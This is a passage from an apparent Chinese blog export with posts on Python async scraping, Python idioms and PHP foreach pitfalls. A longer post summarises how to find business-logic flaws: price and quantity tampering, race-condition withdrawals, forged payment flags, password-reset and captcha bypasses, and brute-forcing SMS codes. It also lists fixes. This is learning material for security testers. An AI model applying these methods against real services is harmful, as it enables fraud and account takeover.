multiprocessing.cpu_count() #cpu数目 print('Cpu count:',cpu_count) pool = multiprocessing.Pool(cpu_count) pool.map(Request,range(10)) end = time.time() print('Cost time:',end - start) #运行结果： Cpu count: 4 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Get response from http://127.0.0.1:5000 Result: Hello! Cost time: 10.076906442642212 多线程(以10次请求为例)：由于无法进行异步及GIL的存在，效率很低，上下文的切换导致开销，甚至时间比单线程更长一点 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport timeimport threadingstart = time.time()def Request(): url = 'http://127.0.0.1:5000' print('Waiting for',url) result = requests.get(url).text print('Get response from',url,'Result:',result)for _ in range(10): t = threading.Thread(target = Request()) t.start() t.join()end = time.time()print('Cost time:',end - start)# 运行结果： Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Waiting for http://127.0.0.1:5000 Get response from http://127.0.0.1:5000 Result: Hello! Cost time: 30.073291301727295 同时使用多进程和异步协程进行请求 异步协程和多进程对网络请求都有提升,将二者结合起来：Facebook 的 John Reese 介绍了 asyncio 和 multiprocessing 各自的特点，并开发了一个新的库，叫做 aiomultiprocess 安装aiomultiprocess pip3 install aiomultiprocess 改写请求网络的代码： 12345678910111213141516171819202122232425262728import asyncioimport aiohttpimport timefrom aiomultiprocess import Poolstart = time.time()async def get(url): session = aiohttp.ClientSession() response = await session.get(url) result = await response.text() session.close() return resultasync def request(): url = 'http://127.0.0.1:5000' urls = [url for _ in range(100)] async with Pool() as pool: result = await pool.map(get, urls) return resultcoroutine = request()task = asyncio.ensure_future(coroutine)loop = asyncio.get_event_loop()loop.run_until_complete(task)end = time.time()print('Cost time:', end - start) 骚思路学习requests实现异步爬虫一 如同前面介绍如何在asyncio中使用requests模块一样，如果想在asyncio中使用其他阻塞函数，该怎么实现呢？虽然目前有异步函数支持asyncio，但实际问题是大部分IO模块还不支持asyncio。 阻塞函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。 解决方案：这个问题的解决方法是使用事件循环对象的run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行，即可以通过run_in_executor方法来新建一个线程来执行耗时函数。 run_in_executor方法 1234AbstractEventLoop.run_in_executor(executor, func, *args)executor 参数应该是一个 Executor 实例。如果为 None，则使用默认 executor。func 就是要执行的函数args 就是传递给 func 的参数 实例（使用time.sleep()） 123456789101112131415161718192021222324import asyncioimport timeasync def run(url): print("start ",url) loop = asyncio.get_event_loop() try: await loop.run_in_executor(None,time.sleep,1) except Exception as e: print(e) print("stop ",url)url_list = ["https://thief.one","https://home.nmask.cn","https://movie.nmask.cn","https://tool.nmask.cn"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))#运行结果start https://thief.onestart https://home.nmask.cnstart https://movie.nmask.cnstart https://tool.nmask.cnstop https://home.nmask.cnstop https://thief.onestop https://tool.nmask.cnstop https://movie.nmask.cn 有了run_in_executor方法，我们就可以使用之前熟悉的模块创建协程并发了，而不需要使用特定的模块进行IO异步开发。 requests实现异步爬虫二 上面说了通过run_in_executor方法来添加线程的方式实现异步。在与之前学过的多线程、多进程相比，asyncio模块有一个非常大的不同：传入的函数不是随心所欲，所以这里以实现time.sleep的时的异步；以及修改函数为一个我们自己定义的函数。 实现time.sleep时的异步（run_in_executor开启了新的线程，再协调各个线程） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import asyncioimport timestart = time.time()def myfun(i): print('start &#123;&#125;th'.format(i)) time.sleep(1) print('finish &#123;&#125;th'.format(i))async def main(): loop = asyncio.get_event_loop() futures = ( loop.run_in_executor( None, myfun, i) for i in range(10) ) for result in await asyncio.gather(*futures): passloop = asyncio.get_event_loop()loop.run_until_complete(main())end = time.time()print(end - start)#运行结果：start 0thstart 1thstart 2thstart 3thstart 4thstart 5thstart 6thstart 7thstart 8thstart 9thfinish 0thfinish 3thfinish 2thfinish 1thfinish 5thfinish 4thfinish 6thfinish 7thfinish 8thfinish 9th1.008263111114502 修改开启的线程数： 12345678910111213141516171819202122232425262728import concurrent.futures as cf # 多加一个模块import asyncioimport timestart = time.time()def myfun(i): print('start &#123;&#125;th'.format(i)) time.sleep(1) print('finish &#123;&#125;th'.format(i))async def main(): with cf.ThreadPoolExecutor(max_workers = 10) as executor: # 设置10个线程 loop = asyncio.get_event_loop() futures = ( loop.run_in_executor( executor, # 按照10个线程来执行 myfun, i) for i in range(10) ) for result in await asyncio.gather(*futures): passloop = asyncio.get_event_loop()loop.run_until_complete(main())end = time.time()print(end - start) 修改函数为爬去豆瓣的电影标题(实际上没有出发异步) 123456789101112131415161718192021222324252627import asyncioimport requestsfrom bs4 import BeautifulSoupimport timestart = time.time()async def get_title(a): url = 'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='.format(a*25) r = requests.get(url) soup = BeautifulSoup(r.content, 'html.parser') lis = soup.find('ol', class_='grid_view').find_all('li') for li in lis: title = li.find('span', class_="title").text print(title)loop = asyncio.get_event_loop()fun_list = (get_title(i) for i in range(10))loop.run_until_complete(asyncio.gather(*fun_list))end = time.time()print(end - start)#运行结果：（部分结果）变脸卡萨布兰卡海盗电台8.284837245941162 修改用run_in_executor开启了新的线程触发异步 1234567891011121314151617181920212223242526272829303132333435363738394041import concurrent.futures as cfimport asyncioimport requestsfrom bs4 import BeautifulSoupimport timestart = time.time()def get_title(i): url = 'https://movie.douban.com/top250?start=&#123;&#125;&amp;filter='.format(i*25) r = requests.get(url) soup = BeautifulSoup(r.content, 'html.parser') lis = soup.find('ol', class_='grid_view').find_all('li') for li in lis: title = li.find('span', class_="title").text print(title)async def main(): with cf.ThreadPoolExecutor(max_workers = 10) as executor: loop = asyncio.get_event_loop() futures = ( loop.run_in_executor( executor, get_title, i) for i in range(10) ) for result in await asyncio.gather(*futures): passloop = asyncio.get_event_loop()loop.run_until_complete(main())end = time.time()print(end - start)#运行结果：（部分）当幸福来敲门乱世佳人怦然心动0.8107953071594238 通过对比可以看出python中协程可以极大的提升I/O操作的效率，在上述爬去豆瓣的250个电影标题中效率提升了一个数量级。 补充 第三方库uvloop可以对aiohttp加速，uvloop库基于libuv，也就是nodejs用的那个库。使用它也非常方便；有一个问题就是uvloop仅支持在Linux下的使用。 1234&gt;import asyncio&gt;import uvloop&gt;asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())&gt; ​ 总结本次通过学习python协程，对于python的高并发、异步编程做了较为全面的了解，同时对python的多线程、多进程、线程池、进程池等问题进行了回顾总结，提升编写工具的性能，目前来说满足了需求，通过本次学习，弥补了一些短板的地方。学习任重而道远！ 本次学习参考的资料链接如下：[]:https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143208573480558080fa77514407cb23834c78c6c7309000 []:https://cuiqingcai.com/6160.html []:http://www.langzi.fun/Python%E5%8D%8F%E7%A8%8B.html]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python编程小技巧]]></title>
    <url>%2F2018%2F10%2F07%2Fpython%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[python编程技巧总结： 在python的编程中会使用各种各样的语法，通过一些小技巧可以优化python代码，学习总结如下。学习参考地址：https://github.com/JeffPaine/beautiful_idiomatic_python 遍历一个序列 python2:(xrange在遍历范围内创建一个迭代器，一次生成一个值，效率比range更高) 12345678910#bad:for i in [0, 1, 2, 3, 4, 5]: print i**2 for i in range(6): print i**2 #better:for i in xrange(6): print i**2 python:(xrange更名为range，进行了优化) 1234567color = ['red','green','blue','yello']#badfor i in range(len(color)): print(color[i])#betterfor co in color: print(co) 遍历倒序 python3: 1234567color = ['red','green','blue','yello']#badfor i in range(len(color)-1,-1,-1): print(color[i])#betterfor co in reversed(color): print(co) 建立序列索引 python3： 123456789colors = ['red', 'green', 'blue', 'yellow'] #badfor i in range(len(colors)): print (i, '---&gt;', colors[i]) #betterfor i, color in enumerate(colors): print (i, '---&gt;', color) 遍历两个序列 python2:(用izip返回迭代) 123456789101112131415names = ['raymond', 'rachel', 'matthew']colors = ['red', 'green', 'blue', 'yellow'] #badn = min(len(names), len(colors))for i in range(n): print names[i], '---&gt;', colors[i] for name, color in zip(names, colors): print name, '---&gt;', color #better for name, color in izip(names, colors): print name, '---&gt;', color python3:(用zip返回迭代) 12345678910names = ['raymond', 'rachel', 'matthew']colors = ['red', 'green', 'blue', 'yellow'] #badn = min(len(names),len(colors))for i in range(n): print(names[i],'---&gt;',colors[i])#batterfor name, color in zip(names,colors): print(name,'---&gt;',color) 遍历排序的序列 python3: 123456789colors = ['red','green','blue','yellow'] #Forward sorted orderfor color in sorted(colors): print(color) #Backwards sorted orderfor color in sorted(colors,reverse=True): print(color) 自定义遍历序列 python3: 123colors = ['red', 'green', 'blue', 'yellow'] print(sorted(colors,key=len)) 遍历文件遇到指定字符退出 python3: 1234567891011121314#badblocks = []while True: block = f.read(32) if block == '': break blocks.append(block) #betterblocks = []if block in iter(partial(read,32),''): blocks.append(block)#iter是一个内置函数用来生产迭代器，partial的不断的读入文件中32字节，注意iter引入第二个参数，表示当读入的内容是''的时候，会触发生成器stop 函数遍历多出口问题 python3: 12345678910111213141516171819#baddef find(seq, target): found = False for i, value in enumerate(seq): if value == target: found = True break if not found: return -1 return i #better(for else结构)def find(seq, target): for i, value in enumerate(seq): if value == target: break else: return -1 return i 遍历字典 python3: 12345678d = &#123;'matthew': 'blue', 'rachel': 'green', 'raymond': 'red'&#125; for k in d: print(k) for k in d.keys(): if k.startswith('a'): del d[k] 遍历键和值： 123456789d = &#123;'matthew': 'blue', 'rachel': 'green', 'raymond': 'red'&#125; #badfor k in d: print(k, '--&gt;', d[k]) #batterfor k,v in d.items(): print(k,'---&gt;',v) 构造字典 python3: 12345names = ['raymond', 'rachel', 'matthew']colors = ['red', 'green', 'blue'] d = dict(zip(names, colors))print(d) 字典的统计 python3: 123456789101112131415colors = ['red', 'green', 'red', 'blue', 'green', 'red']#badd = &#123;&#125;for color in colors: if color not in d: d[color] = 0 d[color] += 1print(d)#batters = &#123;&#125;for color in colors: s[color] = s.get(color,0) + 1print(d) 对序列的值根据元素长度进行分组 python3: 12345678910111213141516171819202122names = ['raymond', 'rachel', 'matthew', 'roger', 'betty', 'melissa', 'judith', 'charlie']#badd = &#123;&#125;for name in names: key = len(name) if key not in d: d[key] = [] d[key].append(name)d = &#123;&#125;for name in names: key = len(name) d.setdefault(key, []).append(name)print(d)#betters = &#123;&#125;for name in names: key = len(name) s.setdefault(key, []).append(name)print(s) 字典遍历倒序 python3:(使用popitem) 12345d = &#123;'matthew': 'blue', 'rachel': 'green', 'raymond': 'red'&#125;while d: key, value = d.popitem() print (key, '--&gt;', value) 字典链接 python3: 12345678910111213141516171819202122import argparseimport osimport collections#baddefaults = &#123;'color': 'red', 'user': 'guest'&#125;parser = argparse.ArgumentParser()parser.add_argument('-u', '--user')parser.add_argument('-c', '--color')namespace = parser.parse_args([])command_line_args = &#123;k:v for k, v in vars(namespace).items() if v&#125;d = defaults.copy()d.update(os.environ)d.update(command_line_args)print(d)#betterd = collections.ChainMap(command_line_args, os.environ, defaults)print(d)#关于Python中ChainMap的使用：http://blog.topspeedsnail.com/archives/9726 使用关键字提高代码清晰度 python3: 12345#badtwitter_search('@obama', False, 20, True)#Bettertwitter_search('@obama', retweets=False, numtweets=20, popular=True) 展开序列 python3: 12345678910p = ['Leo','Xin','30','coder']#badfname = p[0]lname = p[1]age = p[2]email = p[3]#betterfname,lname,age,email = p 交换变量 python3: 1234567891011121314def fibonacci(n): x = 0 y = 1 for i in range(n): print(x) t = y y = x + y x = tdef fibonacci(n): x, y = 0, 1 for i in range(n): print (x) x, y = y, x + y 更新序列 python3: 1234567891011121314151617import collectionsnames = ['raymond', 'rachel', 'matthew', 'roger', 'betty', 'melissa', 'judith', 'charlie']#baddel names[0]names.pop(0)names.insert(0, 'mark')#Betternames = collections.deque(['raymond', 'rachel', 'matthew', 'roger', 'betty', 'melissa', 'judith', 'charlie'])del names[0]names.popleft()names.appendleft('mark')print(names)#利用collections模块里面的双向队列，会更简洁 使用线程锁 python3: 12345678910111213141516import threadinglock = threading.Lock()#badlock.acquire()try: print ('Critical section 1') print ('Critical section 2')finally: lock.release()#Betterwith lock: print ('Critical section 1') print ('Critical section 2') 修改for循环语句 python3: 123456789result = []#badfor i in range(10): s = i ** 2 result.append(s)print (sum(result))#Betterprint (sum(i**2 for i in range(10)))]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[foreach的一些小坑]]></title>
    <url>%2F2018%2F09%2F29%2Fforeach%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91%2F</url>
    <content type="text"><![CDATA[PHP-foreach的一些小坑 再PHP中，foreach是对数组遍历的一个方法，遍历也只用于数组，在编程的时候有一些小坑，记录如下。 foreach的两种语法结构 只遍历引用值： 123456789101112131415foreach (array_expression as $value) statement //示例：&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as $value) &#123; echo $value;&#125;echo "\n";echo $value;?&gt;//显示结果：12344 遍历引用键和值： 123456789101112131415161718192021foreach (array_expression as $key =&gt; $value) statement //示例：&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as $key =&gt; $value) &#123; echo "[$key] =&gt; $value\n";&#125;echo "\n";echo "[$key] =&gt; $value";echo "\n";?&gt; //结果：[0] =&gt; 1[1] =&gt; 2[2] =&gt; 3[3] =&gt; 4[3] =&gt; 4 在foreach中是否使用&amp;的区别： 不使用&amp;，foreach的作用域只在当前循环中，不会改变外部数组的值： 12345678910111213141516171819&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as $value) &#123; $value = $value * 2; echo "$value ";&#125;echo "\n";print_r($arr);//结果：2 4 6 8 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4) 使用&amp;会使得作用域扩大到对应的数组，改变数组的值： 12345678910111213141516171819&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123; $value = $value * 2; echo "$value ";&#125;echo "\n";print_r($arr);//结果：2 4 6 8 Array( [0] =&gt; 2 [1] =&gt; 4 [2] =&gt; 6 [3] =&gt; 8) 在foreach中是否使用&amp;的坑点： 这里和上面的作用域联系起来，没使用以后不会影响数组本身，所以两次foreach的结果互不影响： 123456789101112131415161718192021&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as $value) &#123; // $value = $value * 2; echo "$value ";&#125;echo "\n";echo $value;echo "\n";foreach ($arr as $value) &#123; echo "$value ";&#125;echo "\n";echo $value;//结果1 2 3 4 41 2 3 4 4 使用以后改变了作用域，这里&amp;指向第一次foreach的最后一个地址，在PHP中它不会自动释放该地址： 1234567891011121314151617181920&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123; // $value = $value * 2; echo "$value ";&#125;echo "\n";echo $value;echo "\n";foreach ($arr as $value) &#123; echo "$value ";&#125;echo "\n";echo $value;//结果：1 2 3 4 41 2 3 3 3 查看它每次具体的变化：(这里可以验证每次改变的是&amp;指向的最后一个地址) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123;&#125;;print_r($arr);foreach ($arr as $key =&gt; $value) &#123; echo "&#123;$key&#125; =&gt; &#123;$value&#125; "; print_r($arr);&#125;?&gt;//结果：Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4)0 =&gt; 1 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 1)1 =&gt; 2 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 2)2 =&gt; 3 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 3)3 =&gt; 3 Array( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 3) 解决方法：在每次foreach后unset解除&amp;的指定关系，或者在每次遍历中使用不同的变量名： 123456789101112131415161718192021222324252627282930&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123; echo "$value ";&#125;unset($value);echo "\n";foreach ($arr as $value) &#123; echo "$value ";&#125;?&gt;//结果：1 2 3 4 1 2 3 4 //使用不同的变量名&lt;?php$arr = array(1, 2, 3, 4);foreach ($arr as &amp;$value) &#123; echo "$value ";&#125;echo "\n";foreach ($arr as $val) &#123; echo "$val ";&#125;?&gt;//结果：1 2 3 4 1 2 3 4]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逻辑漏洞挖掘学习总结]]></title>
    <url>%2F2018%2F09%2F17%2F%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[逻辑漏洞挖掘学习（总结完善） 近学习了一下挖逻辑漏洞，针对逻辑漏洞学习到的点做一下总结，主要以看思路和漏洞实例在 学习，参考链接就是总结中的链接以及与这些链接相关的网站，太多了，就直接在文章总列举出 来了。逻辑漏洞的挖掘主要还是在数据包的各个参数上，一定要细心。 工具：BurpSuit(主要的逻辑漏洞的挖掘工具)思路：复杂灵活核心：绕过真实身份认证或者正常业务流程达到预期目的用户身份：认证（用户身份特性认证） 本地认证 服务端认证 业务流程：对业务流程的熟悉程度（各类型网站+业务模式） 制定漏洞模型 重点业务功能区：个人信息区域、密码修改区域、密码忘记区域、支付区域、手机号区域等 逻辑漏洞的类型：支付漏洞：价格、数量、订单、结算、优惠券积分等利用（比如原价100元的A产品可以利用漏洞小于100元去购买，在支付中一般分为三步：订购、确认信息、结算）订单： 选择商品时修改商品的价格（也可以在确认订单的时候修改订单，可以改小或者改为负数） 选择商品时更改商品的数量（如设置为负数） 比如在一个服务器购买网站，他们的硬盘是按G来算的，就好像1G只要1元(假设)，2G只要2元，以此类推，比如那个服务器总共需要200元，我们是否可以修改G的数量来减少支付价格呢，比如我们把G改成-19 商品剩余为一件时，多人同时购买是否产出冲突 生成订单时修改订单的金额 商品为0时是否还可以购买 结算： 优惠活动时打折、优惠券的多次使用 比如在某商城活动的时候领取优惠券，20元的产品规定只能使用5元的，可以修改为15元等 https://www.secpulse.com/archives/40336.html 截断数据包，结算的时候修改订单数量、金额 比如A产品100元，改为-90元 在很多时候，我们都忽略了一个问题，那就是在购买一件商品的时候，我们都喜欢修改成0.01或者负数，但是这里是有一个积分的，就是比如我们在购买1元产品的时候可以获得100积分，但是我们如果将金额数小于1元的话积分就肯定是为空的了，因为这里的积分是按100/元来算的，也就是说，如果我们看到购买xx元有送积分的，我们可以来尝试一下把金额数改成积分最低数，就比如1元。 比如我们在某网站，他们用的是自家的钱包(迷你钱包),这个钱包作用也仅是用于这一个站，在提现时，没有任何验证码或者校验机制，只要输入体现金额就可以提现，并且是秒到账，如果什么负数，修改金额都测试过了都不行，那么你就可以试试多线程并发问题,提现时抓包，比如我现在钱包内有0.1元，那么按理说每提0.01可以提现10次，也就是发送10次进程，但是利用这个问题可以达到多发现几次成功的进程，提现时抓包，然后把数据包发送到BurpSuite工具的Intruder当中，进行批量发送18次，然后可以看到成功的提现到了12次（并发、数据库操作加锁） 比如a产品为999元，当我们购买的时候我们可以试试修改数量成-1个，看是否有变成-999元，我们点击支付一下，一般来说，都可能支付失败的，因为这个时候服务器验证了这个价格是否和服务器中对应的价格是否一样，此时我们可以将-999元的产品放到购物车，再去此网站购买一个1000元产品的购物车，然后我们可以来点击购买，可以看到支付价格就变成了1元(1000+(-999)=1)了 截断数据包，结算的时候修改支付方式（第三方的支付接口逻辑设计不严格就会产生） 比如将百度钱包的接口、微信支付等改为一个其他的接口，如果逻辑设计不严格就会产生漏洞 伪造订单，刷单 例如：在购买一个产品的时候，目标程序时用过A参数判断是否支付，比如A=1实时表示支付，A=0时表示未支付，通过修改可控的A来验证是否可以伪造订单、等。 重复支付（请求重放、多次下单） 比如一些商场中有一些试用卡之类的，通过某种渠道获得的(比如签到，分享网站信息，购买某个商品送来的)，当我们试用的时候主动取消试用，那么这个时候试用卡可能会返回到我们账户中，这里的问题就是如果没有进行对订单多重提交的校验，那么就可导致无限制刷牌子。 比如，我在试用某个产品的时候，每次试用都会产生一个订单号，然后利用刚抓到的数据包进行批量提交，你就可以看到每次提交的订单号不一样，然后这时你再看订单可以看到同一个商品的无数订单，但试用牌子数只扣了你第一个试验时的牌子数，那么这时你申请批量退出试用，那么这么多订单，每退一个就会退相应的牌子数量到账户当中，这就构成了无限制刷得问题 越权支付 比如我们在购买某产品的时候，支付时会出现当前用户的ID，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品 参数污染 请求没该参数，却返回该参数，可请求该参数污染返回值 支付漏洞突破口： 截断数据包，伪造第三方的确认信息 绕过商家确认直接退货 绕过商品类型直接退货（退货是否被允许，比如虚拟商品，话费等） 绕过客户端验证直接确认收货 支付漏洞实例： https://www.0dayhack.com/post-832.html https://www.bigniu.com/bug/view/935 https://www.bigniu.com/bug/view/929 https://www.secpulse.com/archives/47665.html https://www.secpulse.com/archives/41144.html https://www.secpulse.com/archives/39768.html https://www.secpulse.com/archives/36412.html https://www.secpulse.com/archives/35976.html（绕过手机号验证的多种方式） https://www.secpulse.com/archives/35701.html https://www.secpulse.com/archives/35188.html http://www.freebuf.com/vuls/151196.html 支付漏洞修复方案：123456789和银行交易时，做数据签名，对用户金额和订单签名。敏感参数不要明文放在URL中服务端效验客户端提交的参数在服务端计算金额的时候，一定要判断是否为正数。支付过程中加一个服务器生成的key，用户校验参数有没有被串改。如果一定需要用URL传递相关参数，建议进行后端的签名验证订单金额和充值接口返回的数据进行校验提交订单时后台判断单价是否与数据库中相符，如不符则返回错误。支付时应从服务器拉取数据，而不是直接读客户端的值！！ 密码重置漏洞：用户密码找回方式： 手机短信验证码 https://www.secpulse.com/archives/36619.html https://www.secpulse.com/archives/35564.html https://www.secpulse.com/archives/35488.html（直接改返回包） https://www.secpulse.com/archives/35169.html（通过越权修改） https://www.secpulse.com/archives/35023.html https://www.secpulse.com/archives/34710.html https://www.secpulse.com/archives/33800.html 邮箱（密码找回链接） 自动生成新密码 密码重置突破口： 认证凭证暴力破解（多数为验证码4位及以下的纯数字，验证码时间长，不失效可爆破） https://bysec.io/detailsMasked.pyp?id=5 https://www.secpulse.com/archives/41168.html 认证凭证回显（明文传输） https://www.secpulse.com/archives/49496.html 认证凭证重复使用（比如验证码重复使用） 重新绑定（如重新绑定邮箱、手机号且自己可控） https://www.test404.com/post-1352.html?wafcloud_antihack=2 https://xz.aliyun.com/t/2011（密码重置里面、越权） https://bbs.ichunqiu.com/thread-23318-1-1.html 用户身份特性认证（token生成可控） 服务器端认证为空、直接删除验证码、或者认证的特征值可控： https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23343（直接改为修改密码验证的特征值） 本地认证、修改返回值 https://www.secpulse.com/archives/37864.html https://bbs.ichunqiu.com/thread-23319-1-1.html 删除校验码绕过 cookie覆盖 https://bbs.ichunqiu.com/thread-38176-1-1.html 任意用户登录： 空密码绕过（绕过前端改为空值） 身份替换（登录成功产生session） 认证凭证绕过 枚举、越权 https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=24146（通过修改请求头里面的参数进行时间限制的绕过） https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614（通过修改cookie值来绕过验证码时间限制造成短信轰炸） 认证缺陷漏洞： 弱验证 空验证 认证凭证有效性、唯一性 http://www.heavensec.org/index.php/1613.html 身份验证码之暴力破解 （https://bbs.ichunqiu.com/thread-45640-1-1.html） 无防护措施（没有对登录、注册、重置密码之类的功能进行一定的防护，所以当碰到没有验证码的，没有对输错密码次数进行限制，而且还是明文传输的系统，先可以考虑爆破） 锁定机制——&gt;撞库（有些系统会有一些防护措施，比如超过一定的错误次数会将账号进行锁定，或者是某IP频繁的进行登录操作会封IP，这是后可以进行撞库，用弱密码遍历用户名；有些限制并没有在后台验证，也可以加入XFF等方式绕过） 修复：限制单位时间内执行某项操作的次数，要对限制的方法、次数等进行详细的说明，限制的验证也应该再服务端 验证码（可以防止自动化攻击） 图片验证码——&gt;绕过（图片验证码反复使用、验证码在前端校验、验证码可识别、验证码在客户端传输） 短信验证码——&gt;爆破/绕过（与图片类似） 修复：所有的验证码生存周期都应该是一次性的，无论校验成功与失败，且验证码加入干扰线，变形等防止机器识别，对于可爆破的参数加上人机识别，通过设置的阀值来判断；同时验证过程不应将有助于推测正确验证答案的信息返回到客户端。 https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23909 越权： 水平越权 实例： 12345678910111213141516171819https://www.bigniu.com/bug/view/926https://xz.aliyun.com/t/2011https://www.secpulse.com/archives/41142.htmlhttps://www.secpulse.com/archives/38473.htmlhttps://www.secpulse.com/archives/35169.htmlhttps://bbs.ichunqiu.com/thread-39287-1-1.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0196245.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0194518.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193632.html(越权删除+敏感信息泄露)http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192676.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0192848.html（越权任意用户修改+信息泄露）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权之信息泄露）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0193124.html（越权修改+密码重置）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191930.html（整站越权+通过组合越权获取所有信息）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0191192.html（爆破+越权）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0190106.html（绕过signature字段达到越权）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189823.html（越权之信息泄露）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0188760.html（越权之信息泄露）http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0187544.html 垂直越权 实例： 1234https://xz.aliyun.com/t/2011https://www.secpulse.com/archives/41174.htmlhttps://www.secpulse.com/archives/37083.htmlhttp://wooyun.jozxing.cc/static/bugs/wooyun-2016-0189507.html 未授权访问（登录凭证验证） 绕过授权模式（参数构造） 敏感信息泄露：12345678910https://www.bigniu.com/bug/view/930https://www.bigniu.com/bug/view/928https://www.bigniu.com/bug/view/927https://www.secpulse.com/archives/47842.htmlhttps://www.secpulse.com/archives/47482.htmlhttps://www.secpulse.com/archives/42603.htmlhttps://www.secpulse.com/archives/41375.htmlhttps://www.secpulse.com/archives/41253.htmlhttps://www.secpulse.com/archives/41144.htmlhttps://www.secpulse.com/archives/40909.html 接口枚举：业务接口因为没有做验证或者验证机制缺陷，容易遭受枚举攻击、撞库、订单、优惠券遍历补充： 在学习过程中对于遇见的一些新学习到的业务逻辑测试方法的总结 争对客户端刷新验证码的绕过 在一些有验证码的站点，每次进行验证的验证码都是通过第三方的接口调用的，有些验证码是通过加载的，这个时候直接访问加载的地址显示直接就是验证码，所以，正对这种验证码的刷新就可以通过拦截数据包，刚好卡在验证码链接跳转的那一步，进行重放，通过这种方法来绕过。这里通过漏洞银行直播中的两张图来说明 对于滑动验证码的的绕过 现在有好多网站都是滑动验证码，在学习了漏洞银行直播中的业务逻辑挖掘做一个笔记： 首先在滑动验证码哪里查看JS代码，看一下JS代码，看组件是怎么构造加载的，然后确定滑动验证码需要的一些参数 curl 等方式获取页面，查找一些需要的参数 通过获取的参数构造正常滑动以后的链接作为payload 通过curl 访问payload获取数据 .net Nlog日志泄露 